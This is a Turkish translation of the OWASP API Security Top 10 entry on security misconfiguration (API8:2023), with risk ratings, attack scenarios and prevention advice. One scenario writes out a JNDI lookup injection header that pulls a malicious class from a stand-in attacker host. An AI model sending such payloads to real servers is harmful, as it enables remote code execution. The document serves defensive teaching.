# API8:2023 Hatalı Güvenlik Yapılandırması

| Tehdit aktörleri / Saldırı vektörleri | Güvenlik Zayıflığı | Etkiler |
| - | - | - |
| API'ye Özgü · İstismar edilebilirlik: **Kolay** | Yaygınlık: **Çok yaygın** · Tespit edilebilirlik: **Kolay** | Teknik etki: **Ciddi** · İş etkisi: **Kuruluşa özgü** |
| Saldırganlar genellikle yetkisiz erişim veya sistem hakkında bilgi elde etmek için yamalanmamış açıkları, yaygın uç noktaları, güvensiz varsayılan yapılandırmalarla çalışan servisleri veya korunmasız dosya ve dizinleri bulmaya çalışır. Bunların çoğu herkesin bildiği bilgilerdir ve istismar araçları mevcut olabilir. | Hatalı güvenlik yapılandırması, ağ düzeyinden uygulama düzeyine kadar API yığınının herhangi bir katmanında ortaya çıkabilir. Gereksiz servisler veya eski seçenekler gibi hatalı yapılandırmaları tespit etmek ve istismar etmek için otomatik araçlar mevcuttur. | Hatalı güvenlik yapılandırmaları yalnızca hassas kullanıcı verilerini değil, aynı zamanda sunucunun tamamen ele geçirilmesine yol açabilecek sistem detaylarını da açığa çıkarır. |

## API Bu Zafiyete Açık mı?

API aşağıdaki durumlarda zafiyete açık olabilir:

* API yığınının herhangi bir bölümünde uygun güvenlik sıkılaştırması
  eksikse veya bulut servislerinde yanlış yapılandırılmış izinler
  varsa
* En son güvenlik yamaları eksikse veya sistemler güncel değilse
* Gereksiz özellikler etkinse (örn. HTTP fiilleri, günlükleme
  özellikleri)
* HTTP sunucu zincirindeki sunucuların gelen istekleri işleme
  biçiminde tutarsızlıklar varsa
* Aktarım Katmanı Güvenliği (TLS) eksikse
* Güvenlik veya önbellek kontrolü yönergeleri istemcilere
  gönderilmiyorsa
* Kaynaklar Arası Kaynak Paylaşımı (CORS) politikası eksikse veya
  yanlış ayarlanmışsa
* Hata mesajları yığın izlerini (stack trace) içeriyorsa veya başka
  hassas bilgileri açığa çıkarıyorsa

## Örnek Saldırı Senaryoları

### Senaryo 1

Bir API arka uç sunucusu, yer tutucu genişletmeyi ve JNDI (Java Naming
and Directory Interface) aramalarını varsayılan olarak destekleyen
popüler bir üçüncü taraf açık kaynak günlükleme aracıyla yazılan bir
erişim günlüğü tutar. Her istek için günlük dosyasına şu kalıpta yeni
bir kayıt yazılır: `<method> <api_version>/<path> - <status_code>`.

Kötü niyetli bir kişi, erişim günlük dosyasına yazılacak aşağıdaki API
isteğini gönderir:

```
GET /health
X-Api-Version: ${jndi:ldap://attacker.com/Malicious.class}
```

Günlükleme aracının güvensiz varsayılan yapılandırması ve izin verici
bir giden ağ politikası nedeniyle, erişim günlüğüne ilgili kaydı
yazmak amacıyla `X-Api-Version` istek başlığındaki değeri genişletirken,
günlükleme aracı saldırganın uzaktan kontrol ettiği sunucudan
`Malicious.class` nesnesini çekip çalıştırır.

### Senaryo 2

Bir sosyal ağ sitesi, kullanıcıların özel görüşmeler yapmasına olanak
tanıyan bir "Doğrudan Mesaj" özelliği sunar. Belirli bir görüşme için
yeni mesajları almak amacıyla site aşağıdaki API isteğini gönderir
(kullanıcı etkileşimi gerekmez):

```
GET /dm/user_updates.json?conversation_id=1234567&cursor=GRlFp7LCUAAAA
```

API yanıtı `Cache-Control` HTTP yanıt başlığını içermediğinden, özel
görüşmeler web tarayıcısı tarafından önbelleğe alınır ve kötü niyetli
kişilerin bunları dosya sistemindeki tarayıcı önbellek dosyalarından
almasına olanak tanır.

## Nasıl Önlenir?

API yaşam döngüsü şunları içermelidir:

* Güvenliği güçlendirilmiş bir ortamın hızlı ve kolay biçimde devreye alınmasını
  sağlayan, tekrarlanabilir bir sıkılaştırma süreci
* API yığınının tamamındaki yapılandırmaları gözden geçirmek ve
  güncellemek için bir görev. Bu gözden geçirme; orkestrasyon
  dosyalarını, API bileşenlerini ve bulut servislerini (örn. S3 bucket
  izinleri) kapsamalıdır
* Tüm ortamlarda yapılandırma ve ayarların etkinliğini sürekli olarak
  değerlendiren otomatik bir süreç

Ayrıca:

* İstemciden API sunucusuna ve tüm alt/üst akış bileşenlerine giden
  tüm API iletişimlerinin, dahili veya herkese açık bir API olup
  olmadığına bakılmaksızın şifrelenmiş bir iletişim kanalı (TLS)
  üzerinden gerçekleştiğinden emin olun.
* Her API'ye hangi HTTP fiilleriyle erişilebileceği konusunda spesifik
  olun: diğer tüm HTTP fiilleri devre dışı bırakılmalıdır (örn. HEAD).
* Tarayıcı tabanlı istemcilerden (örn. Web Uygulaması ön yüzü)
  erişilmesi beklenen API'ler en azından şunları yapmalıdır:
    * uygun bir Kaynaklar Arası Kaynak Paylaşımı (CORS) politikası
      uygulamak
    * ilgili Güvenlik Başlıklarını dâhil etmek
* Gelen içerik türlerini/veri biçimlerini iş/işlevsel gereksinimleri
  karşılayanlarla sınırlayın.
* Desenkronizasyon sorunlarını önlemek için HTTP sunucu zincirindeki
  tüm sunucuların (örn. yük dengeleyiciler, ters ve ileri proxy'ler ve
  arka uç sunucuları) gelen istekleri tutarlı bir şekilde işlediğinden
  emin olun.
* Uygun olduğunda, istisna izlerinin ve diğer değerli bilgilerin
  saldırganlara geri gönderilmesini önlemek için hata yanıtları da
  dâhil olmak üzere tüm API yanıt gövdesi şemalarını tanımlayın ve
  uygulayın.

## Kaynaklar

### OWASP

* [OWASP Secure Headers Project][1]
* [Configuration and Deployment Management Testing - Web Security Testing
  Guide][2]
* [Testing for Error Handling - Web Security Testing Guide][3]
* [Testing for Cross Site Request Forgery - Web Security Testing Guide][4]

### Harici Kaynaklar

* [CWE-2: Environmental Security Flaws][5]
* [CWE-16: Configuration][6]
* [CWE-209: Generation of Error Message Containing Sensitive Information][7]
* [CWE-319: Cleartext Transmission of Sensitive Information][8]
* [CWE-388: Error Handling][9]
* [CWE-444: Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response
  Smuggling')][10]
* [CWE-942: Permissive Cross-domain Policy with Untrusted Domains][11]
* [Guide to General Server Security][12], NIST
* [Let's Encrypt: a free, automated, and open Certificate Authority][13]

[1]: https://owasp.org/www-project-secure-headers/
[2]: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/README
[3]: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/08-Testing_for_Error_Handling/README
[4]: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery
[5]: https://cwe.mitre.org/data/definitions/2.html
[6]: https://cwe.mitre.org/data/definitions/16.html
[7]: https://cwe.mitre.org/data/definitions/209.html
[8]: https://cwe.mitre.org/data/definitions/319.html
[9]: https://cwe.mitre.org/data/definitions/388.html
[10]: https://cwe.mitre.org/data/definitions/444.html
[11]: https://cwe.mitre.org/data/definitions/942.html
[12]: https://csrc.nist.gov/publications/detail/sp/800-123/final
[13]: https://letsencrypt.org/
